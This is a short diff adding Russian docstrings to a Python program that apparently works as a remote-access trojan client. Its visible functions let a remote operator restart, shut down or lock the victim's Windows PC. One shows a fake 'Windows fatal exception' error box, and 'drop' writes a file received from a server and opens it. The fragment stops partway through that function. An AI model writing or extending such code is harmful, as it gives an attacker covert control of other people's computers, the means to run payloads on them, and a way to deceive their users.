@@ -48,18 +48,22 @@ def sys_command(command):
         return "Неправильная комманда"
 
 def restart_pc():
+    """перезагружает пк"""
     os.system("shutdown /r /t 1")
     return "пк клиента перезапущен"
 
 def shutdown_pc():
+    """выключает пк"""
     os.system("shutdown /s /t 1")
     return "пк клиента выключен"
 
 def lock_pc():
+    """выходит из пользователя ОС"""
     ctypes.windll.user32.LockWorkStation()
     return "пк клиента заблокирован"
 
 def message(text):
+    """выводит сообщение"""
     try:
         text = ' '.join(text)
         ctypes.windll.user32.MessageBoxW(0, text, "Windows fatal exception: code 0xc06d007e", 1)
@@ -69,6 +73,7 @@ def message(text):
         return "при вызове сообщения произошла ошибка"
 
 def drop(name, content):
+    """создает файл загруженный из сервера и открывает его"""
     try:
         if not os.path.exists(name):
             with open(name, "wb") as file:
